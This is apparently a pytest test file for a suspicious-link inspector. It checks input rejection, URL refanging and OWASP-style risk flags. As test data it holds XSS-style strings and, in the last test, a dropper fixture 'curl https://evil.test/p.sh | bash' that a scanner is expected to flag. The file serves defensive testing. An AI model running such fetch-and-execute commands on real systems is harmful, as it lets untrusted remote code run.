import pytest
from link_verifier import inspect_suspicious_link


@pytest.fixture(autouse=True)
def mock_infrastructure_provider(monkeypatch):
    monkeypatch.setattr('link_verifier.inspect_evasion', lambda *args, **kwargs: {
        'domainAgeDays': None, 'freshTlsCertificate': None, 'cloakingDetected': None,
        'evasionRiskScore': 0, 'evasionReasons': [], 'riskLevel': 'LOW', 'limitations': []})


@pytest.mark.parametrize(
    "bad_input",
    [
        "",
        "   ",
        "barrabasadas",
        "hola mundo",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "ftp://archivo.org/recurso",
        "http://999.999.1.1/login",
        "https://sitio con espacios.org",
        "akjriuqw2iu3i3123.2.q..qw..wqe.r.34",
        "https://akjriuqw2iu3i3123.2.q.qw.wqe.r.com/login",
        "akjriuqw2iu3i3123.com",
        "2.q.wqe.r.com",
    ],
)
def test_inspect_suspicious_link_rejects_invalid_inputs(bad_input):
    with pytest.raises(ValueError):
        inspect_suspicious_link(bad_input)


def test_inspect_suspicious_link_accepts_refanged_url_and_ipv4(monkeypatch):
    import link_verifier

    monkeypatch.setattr(link_verifier, "lookup_iocs_detailed", lambda _candidates: [])
    monkeypatch.setattr(link_verifier, "_passive_cert_count", lambda _host: 0)

    res_url = inspect_suspicious_link("hxxps://evil[.]example.org/login")
    assert res_url["normalized_url"] == "https://evil.example.org/login"

    res_ip = inspect_suspicious_link("185.220.101.44")
    assert res_ip["normalized_url"] == "http://185.220.101.44"


def test_inspect_suspicious_link_flags_elenemigos_and_missing_certs(monkeypatch):
    import link_verifier
    from owasp_rules import scan_artifacts_with_owasp

    monkeypatch.setattr(link_verifier, "lookup_iocs_detailed", lambda _candidates: [])
    monkeypatch.setattr(link_verifier, "_passive_cert_count", lambda _host: 0)

    res_warez = inspect_suspicious_link("elenemigos.com")
    assert res_warez["risk_level"] == "HIGH"
    rule_ids = {f["rule_id"] for f in res_warez["owasp_findings"]}
    assert "OWASP-A02-NO-TLS" in rule_ids
    assert "OWASP-A02-NO-CT-CERT" in rule_ids
    assert "OWASP-A08-INTEGRITY-RISK" in rule_ids

    res_http_only = inspect_suspicious_link("http://ejemplo-sin-ssl.org")
    assert res_http_only["risk_level"] in {"MEDIUM", "HIGH"}

    owasp_hits = scan_artifacts_with_owasp([
        {"filename": "dropper.sh", "bytes": b"curl https://evil.test/p.sh | bash\nverify=False"}
    ])
    hit_ids = {h["rule_id"] for h in owasp_hits}
    assert "OWASP-A08-DROPPER" in hit_ids
    assert "OWASP-A05-MISCONFIG" in hit_ids
